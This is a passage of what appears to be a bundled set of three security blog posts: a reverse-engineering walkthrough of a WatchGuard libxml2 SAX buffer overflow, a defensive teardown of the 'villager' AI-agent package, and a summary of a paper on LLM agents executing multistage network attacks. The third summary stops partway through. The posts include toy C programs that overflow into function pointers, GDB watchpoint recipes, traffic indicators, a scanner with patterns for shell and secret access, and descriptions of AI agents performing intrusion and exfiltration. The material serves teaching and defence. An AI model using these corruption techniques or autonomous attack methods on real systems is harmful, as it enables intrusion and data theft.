      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,yg=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
<h1>Villager, Inside Out: FastAPI control plane + LLM task graph + MCP tool runner (with code)</h1>
<blockquote>
<p><strong>Scope &amp; intent:</strong> This is a <strong>defender‑focused technical teardown</strong> of the Python package <strong><code>villager</code></strong> (latest pre‑release commonly referenced: <strong>0.2.1rc1</strong>). The goal is to understand <strong>architecture and risk</strong>, not to enable abuse. Use only in authorized environments.</p>
<p>This blog uses publicly available package metadata (PyPI), a reverse‑engineered GitHub mirror intended “for analysis,” and MCP documentation to explain how the moving parts fit together.</p>
</blockquote>
<hr />
<h2>0) Why Villager is interesting</h2>
<p>Villager is positioned as an “experimental technology project” on PyPI, shipped as a Python package with dependencies that look like a typical <strong>agent stack</strong> (FastAPI, Typer, LangChain, OpenAI client libs, MCP/FastMCP, etc.).</p>
<p>At a high level it resembles a common “agentic automation” pattern:</p>
<ul>
<li>a <strong>web API</strong> to submit work,</li>
<li>an <strong>LLM planner/judge</strong> loop to decide steps and completion,</li>
<li>and a <strong>tool bridge</strong> (MCP) to execute actions in external systems.</li>
</ul>
<p>This architecture is the important part: agentic orchestration changes your risk model because <strong>any tool exposed to the agent becomes part of the agent’s attack surface</strong>.</p>
<hr />
<h2>1) The big picture architecture</h2>
<h3>The layers</h3>
<ol>
<li>
<p><strong>Interface layer (FastAPI + CLI)</strong><br />
   A server exposes endpoints like “create task,” “get status,” “get tree,” “stop task,” “get context.”</p>
</li>
<li>
<p><strong>Scheduler layer (task nodes + branching)</strong><br />
   A task is represented as a node in a <strong>task graph/tree</strong>, which may branch into subtasks based on LLM output.</p>
</li>
<li>
<p><strong>Execution layer (MCP client)</strong><br />
   The “hands” are not inside Villager itself; instead it calls <strong>MCP servers</strong> (e.g., browser automation, a controlled environment runner, etc.).</p>
</li>
<li>
<p><strong>(Optional) Local tool-call layer</strong><br />
   Many agent frameworks also implement internal tool execution (e.g., “call a function by name with JSON args”). In Villager-like systems, this is where risk spikes if the tool set includes <code>subprocess</code> or <code>eval</code> primitives.</p>
</li>
</ol>
<h3>Request lifecycle (conceptual flow)</h3>
<pre><code class="language-text">Client
  |
  |  POST /task   (abstract, description, verification)
  v
FastAPI app
  |
  |  creates TaskNode and runs it in background
  v
TaskNode.execute()
  |
  |-- (branching?) -&gt; create child TaskNodes and execute them
  |
  |-- else -&gt; run_mcp_agent() -&gt; McpClient.execute(prompt)
  |
  |-- judge step -&gt; DONE / TURNING / IMPOSSIBLE (repeat or stop)
  v
Client polls:
  - status
  - task tree
  - context transcript
</code></pre>
<hr />
<h2>2) What MCP is and why it’s central here</h2>
<p><strong>MCP (Model Context Protocol)</strong> is an open protocol for connecting LLM applications to external tools and data sources through a standardized interface. It defines a host/client/server model and protocol semantics. (Think: a “universal adapter” for tools.)</p>
<p>Villager uses MCP to separate the orchestrator from the actual tool execution environment. This is a big deal:</p>
<ul>
<li>It enables powerful workflows without bundling tools inside the package.</li>
<li>It also means the orchestrator can become a “universal remote” for anything the MCP servers expose.</li>
</ul>
<hr />
<h2>3) The API control plane (FastAPI)</h2>
<p>This is the “front door” pattern seen in many agent frameworks:</p>
<ul>
<li>submit a task,</li>
<li>poll its status,</li>
<li>fetch the task tree/graph,</li>
<li>fetch the transcript/context,</li>
<li>stop/interrupt execution.</li>
</ul>
<h3>Example client requests (generic)</h3>
<pre><code class="language-bash"># create a task (example: innocuous compliance doc generation)
curl -s -X POST &quot;http://127.0.0.1:37695/task&quot;   -H &quot;Content-Type: application/json&quot;   -d '{
    &quot;abstract&quot;: &quot;Summarize our incident response runbook&quot;,
    &quot;description&quot;: &quot;Use only our internal documents. Output Markdown.&quot;,
    &quot;verification&quot;: &quot;Includes owners, escalation flow, and contact matrix.&quot;
  }'

# poll status
curl -s &quot;http://127.0.0.1:37695/get/task/status?task_id=&lt;TASK_ID&gt;&quot;

# fetch graph/tree
curl -s &quot;http://127.0.0.1:37695/task/&lt;TASK_ID&gt;/tree&quot;

# fetch context transcript
curl -s &quot;http://127.0.0.1:37695/task/&lt;TASK_ID&gt;/context&quot;
</code></pre>
<blockquote>
<p><strong>Engineering note:</strong> In prototype designs like this, tasks are often stored in memory (a module‑level dict). In production you’d persist tasks in Redis/DB and make IDs per request.</p>
</blockquote>
<hr />
<h2>4) TaskNode: the planner / executor / judge loop</h2>
<p>The core idea is a controller loop like:</p>
<p>1) Ask the LLM: <strong>Should I break this into subtasks?</strong><br />
2) If yes: create subtasks and run them.<br />
3) If no: run a “do work” step via tools/MCP.<br />
4) Ask the LLM: <strong>Is it done?</strong><br />
5) If not: iterate until max retries or failure.</p>
<h3>Pseudocode you can recognize in many agent codebases</h3>
<pre><code class="language-python">class TaskNode:
    def execute(self):
        self.status = &quot;PROCESSING&quot;

        branch = self.llm_should_branch(self.abstract, self.description)
        if branch.need_branching:
            self.children = [TaskNode(t) for t in branch.tasks]
            for child in self.children:
                child.execute()

        output = self.run_mcp_agent()
        verdict = self.llm_judge(output, self.verification)

        if verdict == &quot;DONE&quot;:
            self.status = &quot;DONE&quot;
            return output
        elif verdict == &quot;TURNING&quot;:
            return self.retry_loop()
        else:
            self.status = &quot;IMPOSSIBLE&quot;
            return output
</code></pre>
<p>This <strong>pattern</strong> is what matters, even if variable names differ.</p>
<hr />
<h2>5) MCP client: streaming tool execution</h2>
<p>A common MCP gateway pattern is:</p>
<ul>
<li>send a request (prompt + config),</li>
<li>consume a stream (SSE / newline‑delimited JSON),</li>
<li>keep a transcript of messages and tool results.</li>
</ul>
<h3>Toy MCP streaming consumer (safe example)</h3>
<pre><code class="language-python">import json
import requests

def stream_mcp(base_url: str, payload: dict) -&gt; str:
    &quot;&quot;&quot;
    Safe-to-read example of how an HTTP streaming MCP-like gateway might be consumed.
    (Exact endpoints and schemas vary by implementation.)
    &quot;&quot;&quot;
    out = []
    with requests.post(base_url, json=payload, stream=True, timeout=60) as r:
        r.raise_for_status()
        for line in r.iter_lines(decode_unicode=True):
            if not line:
                continue
            evt = json.loads(line)
            if evt.get(&quot;content&quot;):
                out.append(evt[&quot;content&quot;])
            if evt.get(&quot;done&quot;):
                break
    return &quot;&quot;.join(out)
</code></pre>
<p><strong>Why defenders care:</strong> once this is wired to real tool servers, the orchestrator can cause real-world side effects. Your security posture becomes “how safe are the MCP servers, and how tight is authz?”</p>
<hr />
<h2>6) The “in-band tool call” pattern (%%{json}%%)</h2>
<p>Some agent frameworks support tool calls by asking the model to emit a JSON blob in the middle of text, e.g.:</p>
<pre><code class="language-text">%%{&quot;name&quot;:&quot;SearchFastMcp&quot;,&quot;parameters&quot;:{&quot;query&quot;:&quot;auth&quot;}}%%
</code></pre>
<p>Then code extracts the JSON and runs the corresponding function.</p>
<h3>Minimal parser + allowlist executor (safe pattern)</h3>
<pre><code class="language-python">import json, re
from typing import Any, Callable

TOOL_RX = re.compile(r&quot;%%\\s*(\\{.*?\\})\\s*%%&quot;, re.DOTALL)

def extract_tool_calls(text: str) -&gt; list[dict]:
    calls = []
    for m in TOOL_RX.finditer(text):
        calls.append(json.loads(m.group(1)))
    return calls

def run_tools(calls: list[dict], registry: dict[str, Callable[..., Any]]):
    results = []
    for c in calls:
        name = c.get(&quot;name&quot;)
        args = c.get(&quot;parameters&quot;) or {}
        if name not in registry:
            raise ValueError(f&quot;Tool not allowed: {name}&quot;)
        results.append(registry[name](**args))
    return results
</code></pre>
<p><strong>Defender takeaway:</strong> the parser is not scary; the <strong>tool registry</strong> is. If the registry includes shell execution, file access, credential access, network scanning, etc., the system must be treated like privileged code.</p>
<hr />
<h2>7) The reverse-engineered mirror’s warning: “callbacks” and data egress</h2>
<p>The GitHub mirror you referenced was created “for analysis” and explicitly warns about multiple potential egress paths (proxying and webhooks).</p>
<p>Even if you never “use those tools,” defenders should assume:</p>
<ul>
<li>imports can have side effects,</li>
<li>configuration drift happens,</li>
<li>agents sometimes “discover” and call tools you forgot existed.</li>
</ul>
<p><strong>Rule of thumb:</strong> if it can talk to the network, it can leak data—unless you lock down egress.</p>
<hr />
<h2>8) How to analyze Villager-like packages safely (with code)</h2>
<h3>A) Pin exact artifacts and verify hashes</h3>
<p>1) Download wheels/sdists without executing code.
2) Verify file hashes against the package index metadata.</p>
<pre><code class="language-bash">pip download --no-deps villager==0.2.1rc1
sha256sum villager-0.2.1rc1*.tar.gz villager-0.2.1rc1*.whl
</code></pre>
<h3>B) Static scan for dangerous primitives</h3>
<pre><code class="language-python"># static_scan.py
import pathlib, re

ROOT = pathlib.Path(&quot;.&quot;)  # point at the extracted sdist folder
PATTERNS = {
    &quot;network&quot;: re.compile(r&quot;\\b(requests|httpx|urllib3|socket)\\b&quot;),
    &quot;process&quot;: re.compile(r&quot;\\b(subprocess\\.run|Popen|os\\.system)\\b&quot;),
    &quot;eval_exec&quot;: re.compile(r&quot;\\b(eval|exec)\\b&quot;),
    &quot;secrets&quot;: re.compile(r&quot;\\b(api[_-]?key|token|secret|passwd|password)\\b&quot;, re.I),
}

hits = {k: [] for k in PATTERNS}
for py in ROOT.rglob(&quot;*.py&quot;):
    s = py.read_text(errors=&quot;ignore&quot;)
    for k, rx in PATTERNS.items():
        if rx.search(s):
            hits[k].append(str(py))

for k, files in hits.items():
    print(f&quot;\\n[{k}] {len(files)} files&quot;)
    for f in files[:40]:
        print(&quot; &quot;, f)
</code></pre>
<h3>C) If you must execute: isolate hard</h3>
<ul>
<li>run in a throwaway VM/container</li>
<li>no host mounts (<code>~/.ssh</code>, cloud creds, browser profiles)</li>
<li>run unprivileged user</li>
<li><strong>block outbound network</strong> except to a controlled MCP server</li>
<li>record egress (pcap) for validation</li>
</ul>
<hr />
<h2>9) Building a safer “Villager-like” system (recommended hardening)</h2>
<p>If you’re rebuilding this idea (and you probably should, instead of installing unknown packages):</p>
<p>1) <strong>Separate “planner” from “executor”</strong> with clear boundaries<br />
2) <strong>Never expose “danger primitives”</strong> (shell, eval) directly to the model<br />
3) <strong>Use structured tool calling</strong> (strict JSON schema, validation, allowlists)<br />
4) <strong>Implement per-tool authz</strong> (who can call what, with what parameters)<br />
5) <strong>Add an audit trail</strong> (tool called, args, time, outcome; redact secrets)<br />
6) <strong>Default-deny egress</strong> and require explicit network allowlists<br />
7) <strong>Make tasks durable</strong> (DB/queue), enforce per-request UUIDs, add auth to API</p>
<hr />
<h2>10) References</h2>
<ul>
<li>PyPI: https://pypi.org/project/villager/</li>
<li>GitHub mirror (“for analysis”): https://github.com/gregcmartin/villager</li>
<li>MCP (official): https://modelcontextprotocol.io/</li>
<li>MCP spec (dated): https://modelcontextprotocol.io/specification/2025-11-25</li>
<li>FastMCP docs: https://gofastmcp.com/</li>
<li>FastMCP repo: https://github.com/jlowin/fastmcp</li>
</ul>
  </div>
</body>
</html>
`,wg=`<h1>On the Feasibility of Using LLMs to Execute Multistage Network Attacks – A Technical Breakdown</h1>
<p>Can large language models (LLMs) autonomously conduct complex multi-host cyberattacks? This is the central question addressed by <em>“On the Feasibility of Using LLMs to Execute Multistage Network Attacks.”</em> The paper explores whether state-of-the-art LLMs can perform full multistage network attacks – the kind of realistic attacks that involve multiple phases (reconnaissance, exploitation, lateral movement, privilege escalation, data exfiltration) across multiple hosts. Such attacks reflect real-world breaches (e.g., the Equifax data breach or Colonial Pipeline attack) and are the bread-and-butter of red team exercises and nation-state hacking campaigns. The motivation is clear: if LLMs could execute these attacks autonomously, it could revolutionize red-teaming by augmenting or automating the work of human security testers, allowing defenders to proactively find gaps in their defenses. This technical blog delves into the paper’s contributions – from the evaluation setup and failure analysis to the proposed <strong>Incalmo</strong> framework – providing an objective, detailed breakdown for security researchers.</p>
<hr />
<h2>Evaluation Setup: 10 Multi-Host Environments, LLMs, and Baselines</h2>
<p>To systematically study LLM-driven attacks, the authors built <strong>10 realistic multistage attack environments</strong> (25–50 hosts each) and evaluated several leading LLMs and a baseline system. Each environment is a contained network with a specific scenario and goal (usually to exfiltrate sensitive data from target hosts). The environments include both real breach recreations and synthetic network topologies:</p>
<ul>
<li><strong>Equifax-inspired (50 hosts):</strong> Replica of the Equifax corporate network (as described in breach reports) with known vulnerable services; goal is to exfiltrate all critical data.</li>
<li><strong>Colonial Pipeline-inspired (45 hosts):</strong> An IT/OT network based on the pipeline attack, with two IT subnets and an OT subnet controlling physical devices; goal is to gain control of OT hosts (industrial control systems).</li>
<li><strong>Enterprise A (30 hosts):</strong> A three-tier enterprise network (web server subnet, employee subnet, database subnet); goal is to exfiltrate all sensitive database data.</li>
<li><strong>Enterprise B (40 hosts):</strong> Similar to Enterprise A but larger (four subnets) and requiring more exploits to reach the data; goal is again to exfiltrate all critical data.</li>
<li><strong>4-Layer Chain (25 hosts):</strong> A linear “stepping-stone” chain where each compromised host yields credentials to the next host; each host stores a secret file. Goal is to exfiltrate all files from the chain.</li>
<li><strong>6-Layer Chain (25 hosts):</strong> A harder variant of the chain topology – each hop requires a privilege escalation on the host to access the file (each host has a random privilege-escalation vulnerability).</li>
<li><strong>4-Layer Star (25 hosts):</strong> A single network with many hosts, each vulnerable to some remote code execution. The attacker can directly reach all hosts (star topology); goal is to exfiltrate each host’s critical data.</li>
<li><strong>6-Layer Star (25 hosts):</strong> A tougher star scenario – each host’s data requires privilege escalation and hosts have random privilege-escalation bugs.</li>
<li><strong>Dumbbell A (30 hosts):</strong> Two subnetworks (“dumbbell” shape): one with externally accessible web servers, and one with internal databases. Each web server holds credentials for a specific database. Goal is to use the credentials to compromise databases and exfiltrate data.</li>
<li><strong>Dumbbell B (30 hosts):</strong> Similar to Dumbbell A but adding complexity: database access and data retrieval require elevated privileges (mimicking stricter internal security).</li>
</ul>
<p>These environments were crafted to be realistic and diverse. Two are modeled on real incidents (Equifax and Colonial Pipeline), others on common enterprise designs, and some on topologies from prior research. This provides a thorough testbed for LLMs’ offensive capabilities.</p>
<h3>Evaluated LLMs</h3>
<p>The authors tested six advanced LLMs (from multiple organizations) under code names:</p>
<ul>
<li><strong>Sonnet 3.5</strong></li>
<li><strong>Haiku 3.5</strong></li>
<li><strong>GPT-4o</strong></li>
<li><strong>GPT-4o mini</strong></li>
<li><strong>Gemini 1.5 Pro</strong></li>
<li><strong>Gemini 1.5 Flash</strong></li>
</ul>
<p>These represent models of various sizes and capabilities. By evaluating multiple LLMs, the study can identify whether failures are model-specific or common to the state of the art.</p>
<h3>Baseline – PentestGPT</h3>
<p>In addition to fully-autonomous LLM agents, the paper compares against <strong>PentestGPT</strong>, a human-in-the-loop penetration testing assistant (USENIX Security 2024). PentestGPT uses prompting techniques to guide a human operator in CTF-style tasks. It suggests actions and commands which a human then executes and feeds back results. To test it in this setting, the authors ran PentestGPT on the same 10 scenarios by manually acting as the human operator (entering its recommended commands into the attacker machine). They ensured a fair comparison by only executing concrete commands provided by PentestGPT (if it gave only high-level ideas, they asked it once for a specific command). This tests whether state-of-the-art prompt engineering and human guidance (PentestGPT’s approach) fares better than a fully autonomous LLM agent.</p>
<h3>Success criteria</h3>
<p>An LLM “fully succeeds” in an environment if it achieves <strong>all</strong> attack goals (e.g., exfiltrating all target files or compromising all key hosts), whereas “partial success” means achieving at least one goal (e.g., exfiltrating one critical file out of many).</p>
<p>Using this metric, the initial evaluation was sobering:</p>
<ul>
<li><strong>None</strong> of the LLMs, on their own, could fully complete any of the 10 multistage attacks.</li>
<li>Across 50 trials (5 trials per LLM per environment), there was only <strong>one</strong> instance of even partial success – the model <strong>Sonnet 3.5</strong> managed to exfiltrate a single file (out of 25) in the <strong>4-Layer Chain</strong> scenario.</li>
<li>The human-assisted PentestGPT baseline did no better: <strong>PentestGPT did not manage to achieve even a partial objective in any environment</strong>.</li>
</ul>
<p>In other words, even with state-of-the-art prompting and a human in the loop, the multistage attacks remained unsolved. The only relatively consistent capability LLMs demonstrated was basic reconnaissance (e.g., scanning for hosts/services) – beyond that, they became stuck or made fatal errors.</p>
<p>These results confirmed that multihost, multiphase attacks are a steep challenge for current LLMs, motivating a deeper investigation into why they failed.</p>
<hr />
<h2>Why LLMs Struggle: Attack Graph Failure Analysis</h2>
<p>To understand the failure modes of the LLM “attackers,” the researchers turned to a classic formalism in cybersecurity: <strong>attack graphs</strong>. An attack graph models the possible states an attacker can achieve in the network (nodes) and the actions (edges) that transition between states, ultimately leading to the goal.</p>
<p>For example:</p>
<ul>
<li>Intermediate states might include “gained user access on web server” or “discovered database credentials.”</li>
<li>Edges might represent actions like “exploit web server vulnerability” or “use stolen credentials to log into database.”</li>
</ul>
<p>The team constructed ideal attack graphs for each environment (the Equifax-inspired network’s graph had <strong>246</strong> unique states and <strong>48</strong> goal states, for instance). This gave a ground truth reference of what steps are needed to succeed.</p>
<p>They then mapped the logs of each LLM trial onto the attack graph to see which states the LLM managed to reach and which actions it attempted. This mapping was done via heuristics (e.g., scanning command outputs for evidence that a certain host was found or a certain exploit succeeded).</p>
<h3>What the attack graph analysis revealed</h3>
<p>Across all environments, LLMs only achieved between <strong>1% and 30%</strong> of the attack states – a very low coverage of the necessary steps.</p>
<p>Where did things go wrong? The failures generally fell into two broad categories:</p>
<ol>
<li>
<p><strong>Irrelevant commands (off-path actions):</strong> The LLM often issued commands that had no chance of advancing the attack given the actual environment – in attack graph terms, these commands did not correspond to any useful edge or state. In other words, the LLM was wasting efforts on irrelevant or impossible actions. For example, an LLM might try to use a tool like <code>hydra</code> to brute-force SSH passwords on a host, even though the scenario did not support any password authentication vulnerability (no such weakness existed in the environment). Attempts to “find misconfigured files” on a host that had none, or to exploit services that weren’t actually vulnerable, are other examples of these irrelevant actions. This was a prevalent failure mode: depending on the scenario, <strong>28% to 81%</strong> of the commands issued by LLMs were irrelevant to the true attack path. Such detours not only fail to make progress, but can consume the LLM’s budget of steps or trigger defenses if this were a real system.</p>
</li>
<li>
<p><strong>Incorrectly implemented commands (execution errors):</strong> Even when the LLM chose a relevant action toward the goal, it often executed it incorrectly – using a wrong syntax, tool, or parameter that caused the attempt to fail. For instance, the LLM might recognize that it needs to scan the network, but issue an <code>nmap</code> command with wrong flags or an incorrect IP range, yielding no useful result. Or it might attempt to exploit a known CVE but misconfigure the exploit payload. These “right idea, wrong execution” cases were also common: roughly <strong>9% to 32%</strong> of the commands were relevant steps but implemented incorrectly, according to the analysis. An incorrectly crafted command means the attacker fails to achieve the intended state (even though that state was reachable if the command were done properly).</p>
</li>
</ol>
<p>Crucially, these failure modes reinforce each other in a multistage context. Irrelevant actions squander time and lead the LLM down blind alleys, and execution mistakes prevent progress on the correct path – both result in the agent getting stuck well before completing the attack.</p>
<p>The attack graph perspective made these failure patterns clear, highlighting that LLMs lack reliable strategic focus (they try actions not in the attack plan) and precise low-level execution skills. Prior anecdotal observations suggested LLM agents “have good ideas but execute them poorly” and sometimes “fail to pivot when a strategy fails”; this study formalized that insight.</p>
<p>With this understanding, the authors set out to address the root causes: how to keep the LLM focused on relevant actions and help it properly carry out complex steps.</p>
<hr />
<h2>Introducing Incalmo: High-Level Attack Planning for LLMs</h2>
<p>To overcome these failure modes, the paper proposes <strong>Incalmo</strong>, an intervention layer that sits between the LLM and the target environment.</p>
<h3>Core idea</h3>
<p>Instead of having the LLM directly issue raw shell commands to execute the attack, the LLM outputs higher-level <strong>intentions</strong> (tasks), which Incalmo then handles by executing appropriate low-level actions. By mediating and structuring the LLM’s actions, Incalmo aims to prevent irrelevant or malformed commands from derailing the attack.</p>
<h3>Incalmo’s high-level architecture</h3>
<p>Rather than directly running shell commands (baseline), the LLM provides high-level task directives to Incalmo. Incalmo’s components translate those tasks into the appropriate low-level tool commands (nmap, Metasploit, etc.) and feed results back to the LLM.</p>
<h3>Incalmo’s three main components</h3>
<ul>
<li>
<p><strong>Action Planner:</strong> This module presents the LLM with a set of supported high-level attack tasks (declarative actions like “scan the network,” “infect a host,” “find sensitive files,” “exfiltrate data,” etc.). Instead of relying on the LLM to generate correct Bash commands or Metasploit syntax from scratch, the LLM can choose a high-level task and parameters, and the action planner will translate it into a sequence of low-level commands using a predefined library of attack primitives. By handling the implementation details, the action planner minimizes the risk of incorrect command usage – the LLM no longer needs to remember exact tool flags or syntax for complex actions. This directly tackles the “incorrectly implemented command” failure mode.</p>
</li>
<li>
<p><strong>Attack Graph Service:</strong> To address the issue of irrelevant actions, Incalmo provides an attack graph service that the LLM (and the action planner) can query for guidance. This service encodes knowledge of the logical attack graph of the scenario – essentially, it knows which high-level actions are likely productive given the attacker’s current state. The LLM can use it to ask questions like “what could I do next that leads toward the goal?” or to verify whether a certain host is known to be vulnerable before attempting an exploit. In practice, this means the LLM’s choice of tasks can be informed by the structure of the attack graph, helping it avoid irrelevant commands that don’t map to any viable path forward. (The attack graph service can be thought of as an expert system that keeps the LLM on strategy.)</p>
</li>
<li>
<p><strong>Environment State Service:</strong> This component acts as the LLM’s memory and context for the specific environment. It stores all currently known information about the network state – discovered host IPs, open ports, credentials found, compromised accounts, etc. – as the attack progresses. The LLM can query this state to avoid redundancy and configure tasks correctly. For example, before scanning, the LLM can retrieve the IP range of the network; before trying default credentials, it can check if any credentials have already been found. The environment service ensures commands are tailored to the actual environment details (preventing mistakes like scanning the wrong subnet) and that the LLM always has up-to-date facts about what it has accomplished so far. This makes the attack execution more reliable and environment-agnostic, since the LLM doesn’t have to hard-code environment specifics.</p>
</li>
</ul>
<p>Together, these abstractions allow the LLM to focus on what to do next at a high level, while Incalmo handles how to do it. The LLM’s “language” for interacting with the environment becomes a set of high-level actions and queries, rather than raw shell syntax. This dramatically reduces the chances of syntax errors or irrelevant exploits – the LLM can’t easily go off-script because its choices are constrained to meaningful tasks.</p>
<h3>Using Incalmo</h3>
<p>The workflow involves a preparation phase and an execution loop:</p>
<ol>
<li>
<p><strong>Onboarding Prompt:</strong> First, the LLM is primed with an onboarding prompt that teaches it how to use Incalmo. This prompt describes the available high-level tasks (the “API” of the action planner) and how to ask the attack graph or state services questions. Essentially, the LLM learns it has a special toolkit and must output actions in a structured format.</p>
</li>
<li>
<p><strong>Environment &amp; Goal Context:</strong> The LLM is then given environment-specific details and objectives. For each scenario, a prompt describes the target network (e.g., how many subnets, what is initially known) and the attack goal (e.g., “exfiltrate all customer records from the databases”). This contextual grounding ensures the LLM knows the mission and starting point.</p>
</li>
<li>
